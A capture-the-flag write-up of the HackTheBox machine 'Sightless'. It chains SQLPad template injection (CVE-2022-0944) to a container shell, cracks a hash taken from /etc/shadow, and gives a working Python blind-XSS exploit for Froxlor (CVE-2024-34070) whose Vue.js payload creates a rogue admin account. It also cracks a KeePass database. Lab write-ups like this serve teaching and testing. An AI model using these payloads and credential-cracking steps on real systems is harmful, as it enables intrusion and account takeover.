Three ports. FTP (ProFTPD), SSH, and HTTP. The web page at sightless.htb is a company website. Inspecting the page source reveals a link to a subdomain:

sqlpad.sightless.htb

Add both to /etc/hosts. SQLPad is a web-based SQL editor — version 6.10.0 is visible on the About page.

Phase 1

Initial Access — SQLPad SSTI to Docker Shell

CVE-2022-0944: Template Injection in SQLPad

SQLPad versions up to 6.10.0 are vulnerable to Server-Side Template Injection (SSTI) in the connection test endpoint. This allows unauthenticated RCE.

How SSTI works here SQLPad uses a template engine to process connection parameters. By injecting template syntax into the database connection fields, the server evaluates our code. The payload loads Node.js's child_process module and calls exec() to run arbitrary commands.

Using the public exploit for CVE-2022-0944, we get a reverse shell — but we land inside a Docker container, not the host. However, we're root inside the container.

Extracting Credentials from the Container

As root in the Docker container, we can read /etc/shadow:

# cat /etc/shadow | grep michael
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa...

Crack the SHA-512 hash:

$ hashcat -m 1800 michael_hash.txt /usr/share/wordlists/rockyou.txt
$6$mG3Cp2VPGY...:insaneclownposse
$ ssh michael@sightless.htb
Password: insaneclownposse

michael@sightless:~$ cat user.txt
b5642a0cca1ce8e0d61423c9b8879ac5
Docker container ≠ host, but credentials travel We were root in a container, not the host. But the container shared the same /etc/shadow as the host (or the password was reused). This is a common pattern in Docker misconfigurations — container compromise leads to host credential leakage.

Privilege Escalation — Froxlor → FTP → KeePass → Root

127.0.0.1:3306    ← MySQL
127.0.0.1:3000    ← SQLPad (internal)

Port 8080 hosts Froxlor, a server administration panel. Forward it via SSH:

$ ssh -L 8081:localhost:8080 michael@sightless.htb

Add admin.sightless.htb to /etc/hosts pointing to 127.0.0.1, then access http://admin.sightless.htb:8081/.

CVE-2024-34070: Froxlor Blind XSS

Froxlor (pre-2.1.9) has a Stored Blind XSS vulnerability in the Failed Login Attempts Logging feature. The loginname parameter is logged without sanitization. When the admin views System Logs, injected Vue.js template expressions execute in the admin's browser.

Why Vue.js bypasses the XSS filter Froxlor uses an XSS sanitization library that strips standard <script> tags. But the frontend uses Vue.js, which evaluates {{ }} template expressions. The library doesn't sanitize Vue.js data binding syntax, so a payload like {{constructor.constructor("fetch(...)"}} executes arbitrary JavaScript when Vue renders the log entry.

The exploit sends a failed login with a crafted loginname that, when rendered by Vue.js, makes an API call to create a new admin user:

froxlor_exploit.py
import requests, time

TARGET = "http://localhost:8081"
NEW_USER = "pwned"
NEW_PASS = "pwned1234@@"

# Vue.js XSS payload — creates a new admin via Froxlor API
PAYLOAD = (
    '{{constructor.constructor("fetch(\'/api.php\',{method:\'POST\','
    'headers:{\'Content-Type\':\'application/x-www-form-urlencoded\'},'
    'body:new URLSearchParams({header:document.querySelector('
    '\'meta[name=csrf-token]\').content,'
    f'action:\'admins\',page:\'admins\',view:\'admins.add\','
    f'new_loginname:\'{NEW_USER}\',admin_password:\'{NEW_PASS}\','
    # ... resource limits set to unlimited ...
    'send:\'send\'})})")()} }'
)

# Send failed login attempts with payload as username
for i in range(3):
    requests.post(f"{TARGET}/",
        data={"loginname": PAYLOAD, "password": "x", "send": "send"})

# Wait for admin bot to view logs → triggers XSS → creates user
print("Waiting for bot to trigger...")
$ python3 froxlor_exploit.py

[+] Attempt 1: Status 200
[+] Attempt 2: Status 200
[+] Attempt 3: Status 200
[*] Waiting for admin bot to view System Logs...
[+] SUCCESS! Admin account created after ~30s

Cracking KeePass → Root SSH Key

# Convert KeePass DB to hashcat/john format
$ keepass2john Database.kdb > Database.kdb.hash

# Crack the master password
$ john -w=/usr/share/wordlists/rockyou.txt Database.kdb.hash --format=KeePass
bulldogs
# Open the KeePass database
$ kpcli --kdb=Database.kdb

Appendix

Key Takeaways

Page source often hides subdomains.

Gobuster vhost found nothing, but viewing the HTML source revealed sqlpad.sightless.htb. Always inspect page source, JavaScript files, and embedded links before brute-forcing.

Docker root ≠ host root, but credentials leak.

Container compromise gave us /etc/shadow with reused credentials. Even without container escape, credential reuse between container and host is a common misconfiguration.

Vue.js template syntax bypasses traditional XSS filters.

Froxlor sanitized <script> tags but not Vue.js {{ }} expressions. If the frontend uses a reactive framework, its template syntax becomes an XSS vector when user input is rendered unsanitized.

Internal services compound the attack surface.

The host had Froxlor (8080), MySQL (3306), and SQLPad (3000) all bound to localhost. SSH port forwarding made them accessible. Every internal service is a potential escalation path.

KeePass databases are high-value targets.

A single .kdb file contained the root SSH key. Master passwords are often weak and crackable with keepass2john + rockyou. Always check backup directories for password databases.
